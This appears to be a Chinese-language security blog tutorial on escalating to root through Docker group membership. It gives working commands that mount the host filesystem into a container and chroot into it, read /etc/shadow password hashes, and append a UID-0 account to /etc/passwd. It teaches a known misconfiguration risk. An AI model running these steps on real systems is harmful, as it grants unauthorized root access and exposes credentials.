---
title: Docker 用户组提权
---

<center><h1>Docker 用户组提权</h1><h2>本文作者：一生热爱</h2><br><br></center>

---

## 一、简介

Docker 运行的所有命令都是需要 sudo 来运行，那是因为 docker 需要 root 权限才能跑。

Docker 监护进程有一个特性，它能被允许访问 root 用户或者是在 docker 组里面的所有用户，这就如同拥有 root 的访问权限。

## 二、复现

如果一个服务器有一个普通的用户，并且这个用户加入了 docker 组，则这个用户已经是 root 了。

### 1、方法一

#### 环境搭建

```bash
adduser test-d
usermod -G docker test-d
newgrp docker
```

<img width="800" src="/img/Snipaste_2022-07-07_21-05-45.png"><br>

Docker 组内用户执行命令的时候会自动在所有命令前添加 sudo

因为设计或者其他的原因，Docker 给予所有 docker 组的用户相当大的权力（虽然权力只体现在能访问 /var/run/docker.sock 上面）

#### 复现

默认情况下，Docker 软件包是会默认添加一个 docker 用户组的。

Docker 守护进程会允许 root 用户和 docker组用户访问 Docker，给用户提供 Docker 权限和给用户无需认证便可以随便获取的 root 权限差别不大。

```bash
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
```

<img width="800" src="/img/Snipaste_2022-07-07_21-06-19.png"><br>

参数 -v 将容器外部的目录 / 挂载到容器内部 /hostOS

这个容器的启动脚本是 exploit.sh，主要内容是：chroot 到容器的 /hostOS （也就是宿主机的 /），然后获取到宿主机的 root 权限。

### 2、方法二

#### 环境搭建

```bash
adduser test-d
usermod -G docker test-d
newgrp docker
```

#### 复现

将 /etc/ 目录挂载进 Docker，查看 shadow 和 passwd

```bash
docker run -v /etc/:/mnt -it alpine
cd /mnt
cat shadow
```

<img width="1000" src="/img/Snipaste_2022-07-07_21-07-00.png"><br>

这里已经获取到密码 hash，有两个办法进行权限提升，一是进行 hash 破解，二是添加一个特权账号，这里选择第二个方法。

```bash
openssl passwd -1 -salt test-docker
```

<img width="1000" src="/img/Snipaste_2022-07-07_21-07-24.png"><br>

```bash
docker run -v /etc/:/mnt -it alpine
cd /mnt
echo 'test-docker:saltpasswd:0:0::/root:/bin/bash' >>passwd
```

<img width="800" src="/img/Snipaste_2022-07-07_21-07-57.png"><br>

<img width="800" src="/img/Snipaste_2022-07-07_21-08-59.png">

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年7月7日"
    }
  }
</script>
